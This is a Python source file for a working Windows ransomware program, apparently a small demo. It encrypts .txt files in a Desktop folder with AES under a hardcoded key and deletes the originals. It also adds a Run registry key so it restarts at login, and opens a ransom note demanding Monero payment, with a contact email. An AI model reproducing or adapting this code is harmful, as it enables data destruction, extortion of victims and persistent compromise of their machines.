import os
import hashlib
from Crypto.Cipher import AES
import subprocess
import shutil
import sys
import winreg
from time import sleep
from random import uniform
import getpass
import signal

# Directory to encrypt
dir_path = f'C:\\Users\\{getpass.getuser()}\\Desktop\\EncryptThis'

# RANSOM STEPS FILE NAME
ransom_steps = 'STEPS_TO_DECRYPT'

# Define block size for encryption
BLOCK_SIZE = 16

# Define padding function
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * chr(BLOCK_SIZE - len(s) % BLOCK_SIZE).encode()

# Unpadding function
unpad = lambda s: s[:-ord(s[len(s)-1:])]

# SHA256 hash function
def sha256_hash(string):
    if isinstance(string, bytes):
        return hashlib.sha256(string).hexdigest()
    return hashlib.sha256(string.encode('utf-8')).hexdigest()

# Define encrypt function
def encrypt(raw, key):
    raw = pad(raw)
    iv = sha256_hash(key)[:BLOCK_SIZE]
    cipher = AES.new(key, AES.MODE_CBC, iv.encode())
    return cipher.encrypt(raw)

# Define decrypt function
def decrypt(enc, key):
    iv = sha256_hash(key)[:BLOCK_SIZE].encode('utf-8')
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(enc)).decode('utf-8')

# Encrypt files in given directory with new extension
def encrypt_files(directory, key):
    if not os.path.exists(directory):
        print(f'Directory {directory} does not exist. Exiting program.')
        exit(1)
    for subdir, dirs, files in os.walk(directory):
        for file in files:
            if file != (ransom_steps + '.txt') and file.endswith('.txt'):
                file_path = os.path.join(subdir, file)
                with open(file_path, 'rb') as f:
                    plaintext = f.read()
                encrypted_data = encrypt(plaintext, key)
                new_file_path = file_path + '.whoops'
                with open(new_file_path, 'wb') as f:
                    f.write(encrypted_data)
                os.remove(file_path)

# Decrypt encrypted files in given directory back to original
def decrypt_files(directory, key):
    files_decrypted = False
    if not os.path.exists(directory):
        print(f'Directory {directory} does not exist. Exiting program.')
        exit(1)
    for subdir, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith('.whoops'):
                file_path = os.path.join(subdir, file)
                with open(file_path, 'rb') as f:
                    encrypted_data = f.read()
                try:
                    plaintext = decrypt(encrypted_data, key)
                    new_file_path = file_path[:-6]
                    with open(new_file_path, 'wb') as f:
                        f.write(plaintext.encode('utf-8'))
                    os.remove(file_path)
                    sleep(uniform(0, 1))
                    print(f'File {file_path} decrypted successfully.')
                    files_decrypted = True
                except(ValueError, KeyError):
                    print(f'Failed to decrypt file {file_path}. Error: FileCorrupted.')
    if files_decrypted:
        # Delete startup registry key once files are decrypted
        key_path = 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'
        key_name = 'whoops'
        try:
            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
            winreg.DeleteValue(registry_key, key_name)
            winreg.CloseKey(registry_key)
            note_file = dir_path + f'\\{ransom_steps}' + '.txt'
            os.remove(note_file)
            print('Steps for decryption file removed.')
            sleep(1)
            print('Files decrypted successfully.')
            sleep(1)
            print("Program startup lock removed.")
            print("Close this window. You are free.")
        except Exception as e:
            pass

def main():

    # Key
    key = b'whoops_whoops_69'

    # Add registry key to run .exe on Windows startup
    key_path = 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'
    key_name = 'whoops'
    exe_path = os.path.abspath(sys.argv[0])
    try:
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, key_name, 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(registry_key)
        print('Start: 1')
    except Exception as e:
        print('Start: 0')

    # Open Notepad with decrypt instructions
    notepad_file = os.path.join(dir_path, 'STEPS_TO_DECRYPT.txt')
    with open(notepad_file, 'a') as f:
        f.write('''
    -----------------------------------------------------------------------------------------------------------
    YOUR SYSTEM HAS BEEN INFECTED AND YOUR TEXT (.txt) FILES HAVE BEEN ENCRYPTED

    YOU HAVE 24 HOURS TO DECRYPT YOUR FILES, FOLLOW THE FOLLOWING STEPS

    1. SEND $50 USD WORTH OF MONERO (XMR) TO THE FOLLOWING ADDRESS: <address>

    2. SEND 'PAID' TO THE FOLLOWING EMAIL, ALONG WITH THE ADDRESS YOU SENT WITH TO: 69whoops.decrypt@proton.me
    *WE NEED PROOF OF PAYMENT. FIGURE IT OUT*

    3. YOU WILL GET AN EMAIL BACK WITHIN 12 HOURS WITH THE DECRYPTION KEY. 
       JUST ENTER IT INTO THE PROMPT 'Enter Key: ' IN THE TERMINAL WINDOW, THEN PRESS ENTER

    4. YOU WILL BE NOTIFIED THAT YOUR FILES ARE BEING DECRYPTED IN THE TERMINAL WINDOW

    5. ONCE YOU'RE TOLD TO CLOSE THE WINDOW, YOUR SYSTEM IS NO LONGER INFECTED. TRUST US

    DO NOT ATTEMPT TO DECRYPT WITHOUT THE KEY. DOING SO WILL CAUSE PERMENANT DATA LOSS.

    CLOSING THE TERMINAL WINDOW BEFORE DECRYPTION MAY RESULT IN PERMENANT DATA LOSS
    -----------------------------------------------------------------------------------------------------------
    ''')
    proc = subprocess.Popen(['notepad.exe', notepad_file])
    notepad_pid = proc.pid

    # Encrypt files in directory
    encrypt_files(dir_path, key)

    # Prompt for decryption key
    input_key = input('Enter key: ')

    # Decrypt encrypted files if key is correct
    if input_key.encode('utf-8') == key:
        decrypt_files(dir_path, key)
        os.kill(notepad_pid, signal.SIGTERM)
    else:
        print('Invalid key. Unable to decrypt files.')

    sleep(86400) # 24 HOURS

if __name__ == '__main__':
    main()